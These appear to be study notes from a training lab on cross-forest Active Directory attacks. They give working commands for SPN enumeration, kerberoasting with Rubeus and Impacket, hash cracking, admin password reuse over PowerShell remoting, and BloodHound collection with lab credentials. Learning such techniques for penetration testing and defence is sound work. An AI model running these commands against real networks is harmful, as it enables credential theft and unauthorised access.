# Windows

Cross Forest Kerberoasting
enumerating accounts with SPNs 
```
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```
enumerating the accounts found above
```
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```
kerberoasting
```
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```
we get a hashcat that we can crack using hashcat -m 13100

Admin Password Re-Use & Group Membership
```
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```
the membername might be a sid
```
Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
```
then we can get a session with the credentials
```
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```

# Linux 
Cross Foresting Kerberoasting
```shell-session
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

```
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
```

Hunting Foreign Group Membership with Bloodhound-python
1. Add inlanefreight.local to /etc/resolv.conf
```shell-session
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```
run bloodhound
```shell-session
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```
format
```shell-session
zip -r ilfreight_bh.zip *.json
```
2. Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf
```shell-session
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```
remove the inlanefreight.local
do it again on the new domain
```
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```
get the zip file and then upload both to bloodhound

view dangerous rights through bloodhound

